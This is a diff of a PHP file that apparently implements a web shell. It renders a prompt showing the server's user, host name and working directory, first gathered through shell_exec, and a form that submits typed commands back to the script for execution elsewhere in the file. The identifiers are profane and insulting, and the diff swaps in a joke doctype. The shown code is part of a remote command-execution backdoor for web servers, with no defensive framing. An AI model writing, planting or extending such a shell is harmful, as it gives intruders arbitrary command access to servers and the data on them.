@@ -1,11 +1,13 @@
 <?php
 
-// this next function contains the page's html, no cmd exec happens here
+/*
+ * this next function contains the page's html, no cmd exec happens here
+ */
+
 function fuck_abbott($which){
 
-	// this is a few bits of inf0 for the user, like
-	// www-data@website.org:/var/www/
-	$up_the_dole = shell_exec('echo "$(whoami)@$(hostname):$(pwd)"');
+	// grabbing the nice little bits of info
+	$up_the_dole = kill_a_man_for_his_giro();
 
 	// this is just the location of the script, we need this so the html form
 	// knows where to submit the command, and so you when you press enter/submit,
@@ -13,7 +15,7 @@ function fuck_abbott($which){
 	$putin_huilo = basename($_SERVER['SCRIPT_NAME']);
 
 $html_top = <<< EOF
-<!DOCTYPE HTML>
+<!DOCTYPE SATAN>
 <html>
 	<head>
 		<style>
@@ -22,9 +24,9 @@ $html_top = <<< EOF
 		</style>
 	</head>
 	<body>
-
+	<code><pre>
 		$up_the_dole
-	
+	</pre></code>
 		<form action="$putin_huilo" method="POST">
 			<span>$ </span>
 			<input type="text" name="whosthere" autocomplete="off" autofocus>
